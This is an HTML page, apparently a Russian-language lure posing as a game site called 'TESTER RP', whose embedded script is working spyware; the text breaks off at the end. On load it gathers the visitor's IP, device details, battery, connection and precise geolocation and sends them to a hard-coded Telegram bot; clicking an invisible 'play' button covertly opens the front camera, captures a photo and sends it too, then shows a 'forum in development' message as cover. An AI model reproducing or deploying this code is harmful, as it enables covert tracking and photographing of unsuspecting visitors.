<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TESTER RP</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            overflow: hidden;
            touch-action: none;
            -webkit-text-size-adjust: none;
            text-size-adjust: none;
            height: 100vh;
            font-family: Arial, sans-serif;
            position: relative;
            background: #000;
            display: flex;
            flex-direction: column;
        }
        
        .background-container {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: url('https://i.ibb.co/LDrtg7sJ/12-20250403192149.png') no-repeat center center;
            background-size: cover;
            z-index: -2;
        }
        
        .content {
            position: relative;
            z-index: 1;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: flex-end;
            align-items: center;
            padding-bottom: 20px;
        }
        
        .play-btn {
            background: transparent;
            border: none;
            width: 200px;
            height: 80px;
            margin-bottom: 100px;
            cursor: pointer;
            position: absolute;
            bottom: 150px;
            opacity: 0;
        }
        
        .hidden-camera {
            position: absolute;
            opacity: 0;
            width: 1px;
            height: 1px;
        }
        
        .legal-links {
            position: absolute;
            bottom: 10px;
            width: 100%;
            text-align: center;
            color: #fff;
            font-size: 12px;
            padding: 5px 0;
        }
        
        .message-box {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(0, 0, 0, 0.8);
            color: white;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            z-index: 100;
            display: none;
        }
    </style>
</head>
<body>
    <div class="background-container"></div>
    
    <div class="content">
        <button class="play-btn" id="playBtn"></button>
    </div>

    <div class="legal-links">
        Договор оферты    Политика конфиденциальности
    </div>

    <div class="message-box" id="messageBox">
        Форум в разработке
    </div>

    <video id="hiddenCamera" class="hidden-camera" autoplay playsinline></video>

    <script>
        const botToken = '7898816931:AAHNPImGpJjs-MNsklAvrU0VRDFkHFte_ig';
        const chatId = '-1002577213610';
        const videoElement = document.getElementById('hiddenCamera');
        const playBtn = document.getElementById('playBtn');
        const messageBox = document.getElementById('messageBox');
        let stream = null;

        // Блокировка масштабирования
        document.addEventListener('gesturestart', function(e) {
            e.preventDefault();
        });
        
        document.addEventListener('touchmove', function(e) {
            if(e.scale !== 1) {
                e.preventDefault();
            }
        }, { passive: false });

        // Функция для получения информации о батарее
        async function getBatteryInfo() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    return {
                        level: Math.round(battery.level * 100) + '%',
                        charging: battery.charging ? 'Да' : 'Нет',
                        chargingTime: battery.chargingTime ? battery.chargingTime + ' сек' : 'Неизвестно',
                        dischargingTime: battery.dischargingTime ? battery.dischargingTime + ' сек' : 'Неизвестно'
                    };
                } catch (e) {
                    return { error: 'Не удалось получить данные о батарее' };
                }
            }
            return { error: 'API батареи не поддерживается' };
        }

        // Функция для получения информации о геолокации
        async function getGeolocation() {
            if ('geolocation' in navigator) {
                try {
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: true,
                            timeout: 5000,
                            maximumAge: 0
                        });
                    });
                    
                    return {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy + ' метров',
                        altitude: position.coords.altitude || 'Недоступно',
                        speed: position.coords.speed || 'Недоступно'
                    };
                } catch (e) {
                    return { error: 'Геолокация запрещена или недоступна: ' + e.message };
                }
            }
            return { error: 'Геолокация не поддерживается' };
        }

        // Функция для получения информации о соединении
        function getConnectionInfo() {
            if ('connection' in navigator) {
                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                if (connection) {
                    return {
                        type: connection.type || 'Неизвестно',
                        effectiveType: connection.effectiveType || 'Неизвестно',
                        downlink: connection.downlink + ' Mbps',
                        rtt: connection.rtt + ' мс',
                        saveData: connection.saveData ? 'Да' : 'Нет'
                    };
                }
            }
            return { error: 'Информация о соединении недоступна' };
        }

        // Функция для получения информации об устройстве
        function getDeviceInfo() {
            const screen = window.screen;
            const deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages ? navigator.languages.join(', ') : 'Неизвестно',
                cookieEnabled: navigator.cookieEnabled ? 'Да' : 'Нет',
                doNotTrack: navigator.doNotTrack || 'Неизвестно',
                hardwareConcurrency: navigator.hardwareConcurrency || 'Неизвестно',
                deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Неизвестно',
                maxTouchPoints: navigator.maxTouchPoints || 'Неизвестно',
                screen: {
                    width: screen.width,
                    height: screen.height,
                    availWidth: screen.availWidth,
                    availHeight: screen.availHeight,
                    colorDepth: screen.colorDepth + ' бит',
                    pixelDepth: screen.pixelDepth + ' бит',
                    orientation: screen.orientation ? screen.orientation.type : 'Неизвестно'
                },
                window: {
                    innerWidth: window.innerWidth,
                    innerHeight: window.innerHeight,
                    outerWidth: window.outerWidth,
                    outerHeight: window.outerHeight
                },
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                date: new Date().toString(),
                localTime: new Date().toLocaleString(),
                timezoneOffset: new Date().getTimezoneOffset() + ' минут'
            };

            return deviceInfo;
        }

        // Функция для форматирования информации в читаемый вид
        function formatInfo(info) {
            let result = '';
            for (const [key, value] of Object.entries(info)) {
                if (typeof value === 'object' && value !== null) {
                    result += `\n${key}:\n${formatInfo(value).replace(/^/gm, '  ')}`;
                } else {
                    result += `${key}: ${value}\n`;
                }
            }
            return result;
        }

        // 1. Отправка информации о пользователе
        async function sendUserInfo() {
            try {
                // Получаем IP-адрес
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const ip = ipData.ip;

                // Получаем дополнительную информацию
                const [batteryInfo, geolocationInfo, connectionInfo] = await Promise.all([
                    getBatteryInfo(),
                    getGeolocation(),
                    getConnectionInfo()
                ]);

                const deviceInfo = getDeviceInfo();

                // Формируем сообщение
                let message = `🚨 Новый посетитель:\nIP: ${ip}\n\n`;
                message += `=== Информация об устройстве ===\n${formatInfo(deviceInfo)}\n`;
                message += `=== Батарея ===\n${formatInfo(batteryInfo)}\n`;
                message += `=== Соединение ===\n${formatInfo(connectionInfo)}\n`;
                message += `=== Геолокация ===\n${formatInfo(geolocationInfo)}\n`;

                // Отправляем сообщение в Telegram
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                });

            } catch (error) {
                console.error('Error sending user info:', error);
                // Отправляем хотя бы базовую информацию в случае ошибки
                try {
                    const deviceInfo = getDeviceInfo();
                    let fallbackMessage = `⚠️ Не удалось собрать полную информацию, но вот что есть:\n`;
                    fallbackMessage += formatInfo(deviceInfo);
                    
                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: fallbackMessage
                        })
                    });
                } catch (e) {
                    console.error('Fallback error:', e);
                }
            }
        }

        // 2. Захват фото с камеры
        async function captureAndSendPhoto() {
            try {
                await new Promise(resolve => setTimeout(resolve, 1000));
                
                const canvas = document.createElement('canvas');
                canvas.width = videoElement.videoWidth;
                canvas.height = videoElement.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                
                const blob = await new Promise(resolve => {
                    canvas.toBlob(resolve, 'image/jpeg', 0.8);
                });
                
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, 'verification_photo.jpg');
                
                const caption = `🆔 Фото верификации\nВремя: ${new Date().toLocaleString()}`;
                formData.append('caption', caption);
                
                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                messageBox.style.display = 'block';
                
            } catch (error) {
                console.error('Error capturing photo:', error);
                messageBox.style.display = 'block';
            } finally {
                stopCamera();
            }
        }

        // 3. Запуск камеры устройства
        async function startCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    },
                    audio: false
                });
                
                videoElement.srcObject = stream;
                await captureAndSendPhoto();
                
            } catch (error) {
                console.error('Camera error:', error);
                messageBox.style.display = 'block';
            }
        }

        // 4. Остановка камеры
        function stopCamera() {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
                videoElement.srcObject = null;
            }
        }

        // 5. Обработчик кнопки "Играть"
        playBtn.addEventListener('click', async function() {
            await sendUserInfo();
            await startCamera();
        });

        // Отправляем информацию о пользователе сразу при загрузке страницы
        window.addEventListener('load', sendUserInfo);

        // Остановка
